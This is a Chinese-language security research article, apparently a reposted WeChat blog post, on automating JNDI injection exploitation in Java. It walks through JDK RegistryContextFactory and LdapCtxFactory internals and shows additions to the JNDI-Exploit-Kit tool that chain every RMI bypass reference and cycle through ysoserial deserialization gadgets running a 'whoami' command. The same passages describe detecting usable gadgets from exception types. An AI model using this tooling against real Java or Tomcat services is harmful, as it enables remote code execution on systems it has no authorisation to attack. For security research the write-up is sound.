> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/I-5S45gsVbi9O9oJNhO_FQ)

最近学习了`浅蓝`师傅寻找的一些JNDI漏洞的利用链受益匪浅，自己也尝试关于JNDI漏洞利用做一些挖掘，目前JNDI在利用过程我想到了两个问题。

*   测试每一个JNDI Bypass 利用链都需要手动更改URL很不方便，能否我去请求一个地址，让目标将我所有的链跑一遍？
    
*   JNDI利用过程中可以通过反序列化利用，能否自动化探测反序列化利用链？
    

自动测试Bypass 利用链
--------------

为了让这种方式更加通用，我们首先考虑的是JDK原生的实现`ObjectFactory`的类，那么我注意到了下面几个类。

*   com.sun.jndi.rmi.registry.RegistryContextFactory
    
*   com.sun.jndi.ldap.LdapCtxFactory
    

### RegistryContextFactory

#### 调用分析

通过`getURLs`从Reference获取url列表并封装为数组，`URLsToObject`中对数组中的URL列表发起`RMI`请求，所以RegistryContextFactory满足我们的需求。

```


1.  `public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable<?, ?> var4) throws NamingException {`
    
2.   `//判断是否为引用对象并且factoryClassname为RegistryContextFactory`
    
3.   `if (!isRegistryRef(var1)) {`
    
4.   `return null;`
    
5.   `} else {`
    
6.   `//从引用对象中获取URL列表并循环发起调用`
    
7.   `Object var5 = URLsToObject(getURLs((Reference)var1), var4);`
    
8.   `if (var5 instanceof RegistryContext) {`
    
9.   `RegistryContext var6 = (RegistryContext)var5;`
    
10.   `var6.reference = (Reference)var1;`
    
11.   `}`
    
12.   `return var5;`
    
13.   `}`
    
14.   `}`
    


```

*   getURLs获取URL必须满足RefAddr是StringRefAddr类型且Type属性为URL才会保存。
    

```


1.  `private static String[] getURLs(Reference var0) throws NamingException {`
    
2.   `int var1 = 0;`
    
3.   `String[] var2 = new String[var0.size()];`
    
4.   `Enumeration var3 = var0.getAll();`
    
5.   `//从RefAddr中获取url并保存到数组中`
    
6.   `while(var3.hasMoreElements()) {`
    
7.   `RefAddr var4 = (RefAddr)var3.nextElement();`
    
8.   `//只有RefAddr是StringRefAddr类型，且Type属性为URL才会保存`
    
9.   `if (var4 instanceof StringRefAddr && var4.getType().equals("URL")) {`
    
10.   `var2[var1++] = (String)var4.getContent();`
    
11.   `}`
    
12.   `}`
    
13.   `if (var1 == 0) {`
    
14.   `throw new ConfigurationException("Reference contains no valid addresses");`
    
15.   `} else if (var1 == var0.size()) {`
    
16.   `return var2;`
    
17.   `} else {`
    
18.   `//返回URL数组`
    
19.   `String[] var5 = new String[var1];`
    
20.   `System.arraycopy(var2, 0, var5, 0, var1);`
    
21.   `return var5;`
    
22.   `}`
    
23.   `}`
    


```

*   URLsToObject中创建`rmiURLContextFactory`对象并调用`getObjectInstance`。`getObjectInstance`中判断传入的object类型如果是数组则调用`getUsingURLs`.
    

```


1.  `private static Object URLsToObject(String[] var0, Hashtable<?, ?> var1) throws NamingException {`
    
2.   `rmiURLContextFactory var2 = new rmiURLContextFactory();`
    
3.   `return var2.getObjectInstance(var0, (Name)null, (Context)null, var1);`
    
4.   `}`
    
5.    
    
6.    
    
7.  `public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable<?, ?> var4) throws NamingException {`
    
8.   `if (var1 == null) {`
    
9.   `return new rmiURLContext(var4);`
    
10.   `} else if (var1 instanceof String) {`
    
11.   `return getUsingURL((String)var1, var4);`
    
12.   `} else if (var1 instanceof String[]) {`
    
13.   `//数组类型`
    
14.   `return getUsingURLs((String[])((String[])var1), var4);`
    
15.   `} else {`
    
16.   `throw new ConfigurationException("rmiURLContextFactory.getObjectInstance: argument must be an RMI URL String or an array of them");`
    
17.   `}`
    
18.   `}`
    


```

*   getUsingURLs创建`rmiURLContext`并循环调用lookup发起RMI调用直到获取一个对象并返回。
    

```


1.  `private static Object getUsingURLs(String[] var0, Hashtable<?, ?> var1) throws NamingException {`
    
2.   `if (var0.length == 0) {`
    
3.   `throw new ConfigurationException("rmiURLContextFactory: empty URL array");`
    
4.   `} else {`
    
5.   `rmiURLContext var2 = new rmiURLContext(var1);`
    
6.   `try {`
    
7.   `NamingException var3 = null;`
    
8.   `int var4 = 0;`
    
9.   `while(var4 < var0.length) {`
    
10.   `try {`
    
11.   `Object var5 = var2.lookup(var0[var4]);`
    
12.   `return var5;`
    
13.   `} catch (NamingException var9) {`
    
14.   `var3 = var9;`
    
15.   `++var4;`
    
16.   `}`
    
17.   `}`
    
18.   `throw var3;`
    
19.   `} finally {`
    
20.   `var2.close();`
    
21.   `}`
    
22.   `}`
    
23.   `}`
    


```

#### 利用分析

通过`RegistryContextFactory`利用只能使用`rmi`协议发起请求，所以目前只能用这种方式检测rmi相关的利用，在`welk1n`师傅的`JNDI- Exploit- Kit`工具中集成了一部分关于RMI的利用链，其中也包含了`Tomcat`和`GROOVY`的bypass，当然Groovy的执行也依赖Tomcat。工具运行后会生成一些RMI的URL，我们可以将`RegistryContextFactory`也加到利用链中。

在`RMIRefServer`中包含了RMI处理的逻辑，因此可以把`RegistryContextFactory`引用也注册进去。

```


1.  `/*`
    
2.   `* Fuzz All Bypass`
    
3.   `* Created by 藏青`
    
4.   `*/`
    
5.   `public ResourceRef execAll() throws RemoteException, NamingException{`
    
6.   `ResourceRef ref = new ResourceRef("xxxx", null, "", "",`
    
7.   `true, "com.sun.jndi.rmi.registry.RegistryContextFactory", null);`
    
8.   `//Mapper.references中保存了随机生成的rmi名称和利用方式的关系`
    
9.   `for (Map.Entry<String, String> entry : Mapper.references.entrySet()) {`
    
10.   `String mapKey = entry.getKey();`
    
11.   `String mapValue = entry.getValue();`
    
12.   `//如果是RegistryContextFactory则跳过，否则会造成递归查询`
    
13.   `if(!mapValue.equals("BypassTestAll")){`
    
14.   `ref.add(new StringRefAddr("URL",String.format("rmi://%s:1099/%s", ServerStart.rmi_addr,mapKey)));`
    
15.   `}`
    
16.   `}`
    
17.   `return ref;`
    
18.   `}`
    


```

`RMIRefServer#handleRMI`中会根据请求的url找到对应的处理方法生成引用对象并返回，所以我们只要将我们构造的`execAll`方法也加入到if判断中即可。

```


1.  `private boolean handleRMI ( ObjectInputStream ois, DataOutputStream out ) throws Exception {`
    
2.   `int method = ois.readInt(); // method`
    
3.   `ois.readLong(); // hash`
    
4.   `if ( method != 2 ) { // lookup`
    
5.   `return false;`
    
6.   `}`
    
7.   `//获取rmi请求的对象名称，这里是随机生成的额名称`
    
8.   `String object = (String) ois.readObject();`
    
9.   `System.out.println(getLocalTime() + " [RMISERVER]  >> Is RMI.lookup call for " + object + " " + method);`
    
10.   `String cpstring = this.classpathUrl.toString();`
    
11.   `//根据取出的名称从Mapper.references中取出利用方式对应的名称`
    
12.   `String reference = Mapper.references.get(object);`
    
13.   `if (reference == null) {`
    
14.   `System.out.println(getLocalTime() + " [RMISERVER]  >> Reference that matches the name(" + object + ") is not found.");`
    
15.   `//return false;`
    
16.   `cpstring = "BypassByGroovy";`
    
17.   `}`
    
18.   `URL turl = new URL(cpstring + "#" + reference);`
    
19.   `out.writeByte(TransportConstants.Return);// transport op`
    
20.   `try ( ObjectOutputStream oos = new MarshalOutputStream(out, turl) ) {`
    
21.   `oos.writeByte(TransportConstants.NormalReturn);`
    
22.   `new UID().write(oos);`
    
23.   `//创建ReferenceWrapper包装类`
    
24.   `ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);`
    
25.   `//    根据名称不同调用不同的方法得到对应的引用对象`
    
26.   `if (reference.startsWith("BypassByEL")){`
    
27.   `System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassByEL.");`
    
28.   `Reflections.setFieldValue(rw, "wrappee", execByEL());`
    
29.   `} else if (reference.startsWith("BypassByGroovy")){`
    
30.   `System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassByGroovy.");`
    
31.   `Reflections.setFieldValue(rw, "wrappee", execByGroovy());`
    
32.   `}`
    
33.   `//将我们的构造的execAll方法加到判断中`
    
34.   `else if (reference.startsWith("BypassTestAll")){`
    
35.   `System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference for BypassTestAll.");`
    
36.   `Reflections.setFieldValue(rw, "wrappee", execAll());`
    
37.   `}`
    
38.   `else {`
    
39.   `System.out.println(`
    
40.   `String.format(`
    
41.   `getLocalTime() + " [RMISERVER]  >> Sending remote classloading stub targeting %s",`
    
42.   `new URL(cpstring + reference.concat(".class"))));`
    
43.   `Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", reference, turl.toString()));`
    
44.   `}`
    
45.   `Field refF = RemoteObject.class.getDeclaredField("ref");`
    
46.   `refF.setAccessible(true);`
    
47.   `refF.set(rw, new UnicastServerRef(12345));`
    
48.   `oos.writeObject(rw);`
    
49.   `oos.flush();`
    
50.   `out.flush();`
    
51.   `}`
    
52.   `return true;`
    
53.   `}`
    


```

由于`util.Mapper#references`中包含了引用关系，所以这里也需要做下更改。

```


1.  `static {`
    
2.  `...`
    
3.   `references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"BypassTestAll");`
    
4.  `instructions.put("BypassTestAll","Build in "+ withColor("JDK - (BYPASSAll by @藏青)",ANSI_RED) +" whose test All Bypass Payload");`
    
5.  `}`
    


```

当然我们也可以把之前分析的一些利用链也加进去，但是这并不是我们本片文章的重点，就不分析了。添加并启动后，可以看到我们我们添加的利用链地址。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFO9hklSM7U6jvsCSTRXD0nLicpzRicQO2N9U3tfrr5jAOkkicbnRDj7arg/640?wx_fmt=png)

在tomcat中请求我们创建的`registry`会将所有的利用链跑一遍，如果利用失败则会导致异常进入下一个利用链，直到跑成功获取对象并返回。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFzHibOkAlZ3vZvvMfQveVEsorFmpjQs7JKRddCIIdmDsT5yvD4ItMvEQ/640?wx_fmt=png)

我们也可以从server端进行验证，因为我这里使用的tomcat8所以跑到el表达式后利用成功并返回。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFib60LEo5dI9mjiaoxr4tGibpPvZRgIoAjd7ZpCeemtbiawNibKIr60pfkKw/640?wx_fmt=png)

#### 栈溢出

忽然想到如果我们在引用中的地址也是`RegistryContextFactory`那不就会导致递归的lookup查询，是否会产生什么问题。服务端代码如下：

```


1.  `Registry registry = LocateRegistry.createRegistry(1099);`
    
2.   `Reference ref = new Reference("javax.sql.DataSource","com.sun.jndi.rmi.registry.RegistryContextFactory",null);`
    
3.   `ref.add(new StringRefAddr("URL","rmi://127.0.0.1:1099/Foo"));`
    
4.   `ReferenceWrapper wrapper = new ReferenceWrapper(ref);`
    
5.   `registry.bind("Foo", wrapper);`
    


```

经过测试递归查询会触发tomcat的栈溢出异常，但是并不会对程序的使用产生影响。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFwC06dqyYUkic82ERWy8q77WFnO3Lia2JbgzoiblbFPaAax5jO9EXDahdQ/640?wx_fmt=png)

### LdapCtxFactory

`LdapCtxFactory`和`RegistryContextFactory`相对应，具体的过程不分析了，最终是通过`LdapCtxFactory#getUsingURL`来执行，但是只会获取到`DirContext`并没有调用Lookup方法，所以似乎不能利用。

```


1.  `private static DirContext getUsingURL(String var0, Hashtable<?, ?> var1) throws NamingException {`
    
2.   `Object var2 = null;`
    
3.   `LdapURL var3 = new LdapURL(var0);`
    
4.   `String var4 = var3.getDN();`
    
5.   `String var5 = var3.getHost();`
    
6.   `int var6 = var3.getPort();`
    
7.   `String var8 = null;`
    
8.   `String[] var7;`
    
9.   `if (var5 == null && var6 == -1 && var4 != null && (var8 = ServiceLocator.mapDnToDomainName(var4)) != null && (var7 = ServiceLocator.getLdapService(var8, var1)) != null) {`
    
10.   `String var9 = var3.getScheme() + "://";`
    
11.   `String[] var10 = new String[var7.length];`
    
12.   `String var11 = var3.getQuery();`
    
13.   `String var12 = var3.getPath() + (var11 != null ? var11 : "");`
    
14.   `for(int var13 = 0; var13 < var7.length; ++var13) {`
    
15.   `var10[var13] = var9 + var7[var13] + var12;`
    
16.   `}`
    
17.   `var2 = getUsingURLs(var10, var1);`
    
18.   `((LdapCtx)var2).setDomainName(var8);`
    
19.   `} else {`
    
20.   `var2 = new LdapCtx(var4, var5, var6, var1, var3.useSsl());`
    
21.   `((LdapCtx)var2).setProviderUrl(var0);`
    
22.   `}`
    
23.   `//返回DirContext对象`
    
24.   `return (DirContext)var2;`
    
25.   `}`
    


```

自动测试反序列化利用链
-----------

通过对问题一的分析，我们现在只能利用`RMI`协议来协助我们一次性发起多个RMI调用，目前的大多数工具都是基于Ldap来进行反序列化利用的，不过在RMI中也可以通过反序列化利用。

首先我们要利用的场景是去通过RMI攻击客户端，所以可以利用`ysoserial#JRMPListener`模块来利用，它构建了一个`JRMP`监听，当客户端发起请求时会构建一个异常对象`BadAttributeValueExpException`，并在这个异常对象的`val`属性中放入我们要构造好的恶意对象。

```


1.  `out.writeByte(TransportConstants.Return);// transport op`
    
2.   `ObjectOutputStream oos = new JRMPClient.MarshalOutputStream(out, this.classpathUrl);`
    
3.   `//写入异常标识`
    
4.   `oos.writeByte(TransportConstants.ExceptionalReturn);`
    
5.   `new UID().write(oos);`
    
6.   `//构建BadAttributeValueExpException异常对象，并在val属性中加入恶意对象。`
    
7.   `BadAttributeValueExpException ex = new BadAttributeValueExpException(null);`
    
8.   `Reflections.setFieldValue(ex, "val",payload );`
    
9.   `oos.writeObject(ex);`
    


```

当客户端发起请求时,会在`StreamRemoteCall#executeCall`中通过判断`returnType`是否为`TransportConstants#ExceptionalReturn`来决定是否反序列化，也就是只有返回出现异常时才会对异常对象进行反序列化。

```


1.  `switch (returnType) {`
    
2.   `case TransportConstants.NormalReturn:`
    
3.   `break;`
    
4.   `case TransportConstants.ExceptionalReturn:`
    
5.   `Object ex;`
    
6.   `try {`
    
7.   `//当返回类型为ExceptionalReturn则进行反序列化`
    
8.   `ex = in.readObject();`
    
9.   `} catch (Exception e) {`
    
10.   `throw new UnmarshalException("Error unmarshaling return", e);`
    
11.   `}`
    
12.   `// An exception should have been received,`
    
13.   `// if so throw it, else flag error`
    
14.   `if (ex instanceof Exception) {`
    
15.   `exceptionReceivedFromServer((Exception) ex);`
    
16.   `} else {`
    
17.   `throw new UnmarshalException("Return type not Exception");`
    
18.   `}`
    
19.   `// Exception is thrown before fallthrough can occur`
    
20.   `default:`
    
21.   `if (Transport.transportLog.isLoggable(Log.BRIEF)) {`
    
22.   `Transport.transportLog.log(Log.BRIEF,`
    
23.   `"return code invalid: " + returnType);`
    
24.   `}`
    
25.   `throw new UnmarshalException("Return code invalid");`
    
26.   `}`
    


```

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFtPJSUViaSRxlj8pvv0ic2syvLiclh5dF1YnaTQw7ibzKpg9c9QNtf3PLRw/640?wx_fmt=png)

但是由于我们构建了一个异常对象，在执行过程中会抛出异常。而我们在分析`RegistryContextFactory`时说过，只有当返回正常时才会停止，返回异常会继续请求其他的RMI地址，所以如果这样利用，只能把所有的反序列化利用链Fuzz一遍，我们并不知道哪个利用链可用。

### 失败尝试一

分析在`StreamRemoteCall#executeCall`的利用过程我发现，只要设置了`TransportConstants#ExceptionalReturn`都会进行反序列化，如果我们仅仅设置了这个字段，但是传入的是只是我们的恶意对象，能否绕过此处的报错？所以我对JRMPListener做了如下更改。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsF9eAf8icNVZZe9z3lkv0fpw7oUJomtcgAp0EQ76ibR78qE3WmMoibQbYvQ/640?wx_fmt=png)

但是在反序列化结束后会判断我们传入的是否为异常对象，如果不是也会抛异常。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFxO6nae3dusic6QbCpEojjcibatvTd3IY3ujQEPdzJeRIsXzWhIRVMIiaA/640?wx_fmt=png)

### 失败尝试二

继续分析发现`RegistryImpl_Stub#lookup`中也会进行反序列化，但是会将反序列化的结果转成Remote类型，如果我们返回的不是Remote的实现类也会导致异常。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFMvARbaHkXiagYQB5WZxrPeghxnURric6x05FZGSjAR6rodic3ZmcNORnA/640?wx_fmt=png)

### 利用分析

虽然我们不能直接通过是否继续请求来判断利用链存在，但是还是可以通过DNSLog的方式进行判断。我们可以在每次请求后获取DNSLog的结果，如果有返回值则代表利用链可用。

但是在编写好代码测试时惊喜的发现，在利用失败捕获异常时只会捕获`NamingException`类型的异常。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFV9sNGKM0TdqPH0Xo2NrxwCHNWiaFXaoL597FHT5oKLDlK3TiahRHbNGA/640?wx_fmt=png)

如果利用链没找到，会抛出`CommunicationException`异常，而这个异常是`NamingException`的子类，因此会被捕获

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFlGp2Zd8fDIhBuVtgzA0XPqGkDic3EmAia143ycGMozYFiciaWXQA9Gfekg/640?wx_fmt=png)

如果利用成功，抛出的是其他类型的异常，则不会被捕获。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsF54ZhLGqC1gibLcy0ffvicia0ib6HKEn2losT91wIFY5AudbLoHLm3FKE6g/640?wx_fmt=png)

但是这里还有一个问题，有些利用类存在，但是由于JDK版本或者其他问题导致不能利用，比如`CC1`，这个时候也会抛出其他异常，但是并不能触发漏洞，所以在自动化探测的时候要将这些类去除掉。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFHdk88bIqdMuuTMPIkicEiaP67Ys1y4LjJibnbBt99G12ABTg3jah50ehQ/640?wx_fmt=png)

大概测了下在CC链中`CC1`,`CC3`,`CC7`都不能使用。`CC1`和`CC3`都是因为JDK版本过高无法使用可以理解，但是在`CC7`中明明可以执行成功但是还是会返回`CommunicationException`异常。

其他的利用链也先不测试了，这里只大致说下思路。通过这种实现已经可以达到自动化探测部分利用链了。最终我们服务端请求中最后一个请求的`gadget`就是存在的利用链。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFBNiaeYcLtJQdUJImCicBhy0oN2sbJY85Og6aicuVricibk9CnEvk1Cueic4Q/640?wx_fmt=png)

代码实现主要是在`JNDI-Exploit-Kit`基础上做了一点点小改进，主要是在if判断中继续加上了`execAllGadgat`方法。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFT47uvfzxqvw50eWQr1GBBhbe6DXLicm4479Ye3ebYXM3U0DBxiaxOMXg/640?wx_fmt=png)

在`execAllGadgat`方法中遍历已经添加的利用链并添加到引用对象中。

```


1.  `public static String[] gadgets=new String[]{"CommonsBeanutils1","CommonsCollections10","CommonsCollections2","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections8","CommonsCollections9","Hibernate1","JBossInterceptors1","JSON1","JavassistWeld1","Jdk7u21","MozillaRhino1","MozillaRhino2","ROME","Vaadin1","Jre8u20"};` 
    
2.  `public Object execAllGadgat() {`
    
3.   `ResourceRef ref = new ResourceRef("xxxx", null, "", "",`
    
4.   `true, "com.sun.jndi.rmi.registry.RegistryContextFactory", null);`
    
5.   `for(String gadget:gadgets){`
    
6.   `ref.add(new StringRefAddr("URL",String.format("rmi://%s:1099/serial/%s", ServerStart.rmi_addr,gadget)));`
    
7.   `}`
    
8.   `return ref;`
    
9.   `}`
    


```

由于我们的Payload并没有在`references`中添加，因此从Map中会获取不到，所以我这里加了一个判断，当object以ser开头，则表示是通过反序列化利用，给`reference`赋值。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFaIV2INLw3WibBibEAznhreaPwsFqFQ3vhBQDAtlEbVlOacd512CvFsSA/640?wx_fmt=png)

最后再加上一个引用判断，如果以`serial`开头则取出调用链名称获取恶意对象直接写入。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SiaWZ2HKRrchRGtZI6LwYPsFNaOj4EN9iaGqjUh8UJIVLgmiaTgE9nL3tZcdmP7UicO9FxS2PcRTSO6HA/640?wx_fmt=png)

```


1.  `public Object execGadgets(String className) throws Exception {`
    
2.   `Class clazz = Class.forName("ysoserial.payloads."+className);`
    
3.   `ObjectPayload<?> payload = (ObjectPayload<?>) clazz.newInstance();`
    
4.   `final Object objBefore = payload.getObject("whoami", "exec_global");`
    
5.   `return objBefore;`
    
6.   `}`
    


```

总结
--

虽然这次的小发现对于JNDI漏洞的利用来说可能有些画蛇添足，通过这几天的研究也发现了自己对RMI请求理解上的不足，最后对这种利用方式做一个总结。

*   由于我们要传入一个ObjectFactory类名，所以需要一个Reference对象，但是JDK自带的只有`LinkRef`，不能传递ObjectFactory的类名，所以这里还是使用了tomcat中的`ResourceRef`,所以还是有些依赖Tomcat。
    
*   由于`LdapCtxFactory`最终没有调用Lookup方法，因此目前只能通过RMI协议来进行自动化检测
    
*   由于`CC1`,`CC3`,`CC7`无法通过返回的异常类型判断是否存在，所以不能检测这几条链。目前我只测了CC链，其他类型的利用链是否有异常未测试